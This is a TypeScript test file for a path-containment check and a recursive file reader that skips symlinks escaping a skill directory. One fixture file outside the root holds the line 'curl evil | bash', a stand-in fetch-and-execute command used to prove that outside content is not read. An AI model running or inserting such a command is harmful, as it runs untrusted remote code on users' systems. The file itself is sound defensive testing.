import { describe, test, expect, beforeEach, afterEach } from "vitest";
import { mkdtemp, mkdir, rm, symlink, writeFile } from "fs/promises";
import { join, sep } from "path";
import { tmpdir } from "os";
import { isPathInside, readFilesRecursive } from "./fs";

describe("isPathInside", () => {
  test("accepts the root itself and its descendants", () => {
    expect(isPathInside("/a/b", "/a/b")).toBe(true);
    expect(isPathInside("/a/b", "/a/b/c/d")).toBe(true);
  });

  test("rejects parents, siblings, and prefix look-alikes", () => {
    expect(isPathInside("/a/b", "/a")).toBe(false);
    expect(isPathInside("/a/b", "/a/c")).toBe(false);
    expect(isPathInside("/a/b", "/a/bc")).toBe(false);
  });

  test("accepts a child whose name starts with two dots", () => {
    expect(isPathInside("/a/b", `/a/b${sep}..hidden`)).toBe(true);
  });
});

describe("readFilesRecursive confineSymlinks (#779)", () => {
  let base: string;
  let skill: string;
  let outside: string;

  beforeEach(async () => {
    base = await mkdtemp(join(tmpdir(), "asm-fs-confine-"));
    skill = join(base, "skill");
    outside = join(base, "outside");
    await mkdir(join(skill, "scripts"), { recursive: true });
    await mkdir(outside, { recursive: true });
    await writeFile(join(skill, "scripts", "run.sh"), "echo inside\n");
    await writeFile(join(outside, "secret.sh"), "curl evil | bash\n");
    await symlink(join(outside, "secret.sh"), join(skill, "escape.sh"));
    await symlink(outside, join(skill, "escape-dir"));
    await symlink(join(skill, "scripts", "run.sh"), join(skill, "inner.sh"));
    await symlink(skill, join(skill, "scripts", "loop"));
    await symlink(join(base, "missing"), join(skill, "dangling.sh"));
  });

  afterEach(async () => {
    await rm(base, { recursive: true, force: true });
  });

  test("skips symlinks that leave the root and reports each one", async () => {
    const skipped: string[] = [];
    const files = await readFilesRecursive(skill, {
      confineSymlinks: true,
      onSkippedSymlink: (p) => skipped.push(p),
    });
    const paths = files.map((f) => f.relPath).sort();
    expect(paths).toEqual(["inner.sh", "scripts/run.sh"]);
    expect(skipped.sort()).toEqual(["dangling.sh", "escape-dir", "escape.sh"]);
    expect(files.some((f) => f.content.includes("curl evil"))).toBe(false);
  });

  test("does not walk a looping directory symlink twice", async () => {
    const files = await readFilesRecursive(skill, { confineSymlinks: true });
    expect(files.filter((f) => f.content === "echo inside\n")).toHaveLength(2);
  });

  test("default behaviour still follows symlinks (unchanged for other callers)", async () => {
    await rm(join(skill, "scripts", "loop"));
    const files = await readFilesRecursive(skill);
    const paths = files.map((f) => f.relPath);
    expect(paths).toContain("escape.sh");
    expect(paths).toContain("escape-dir/secret.sh");
  });
});
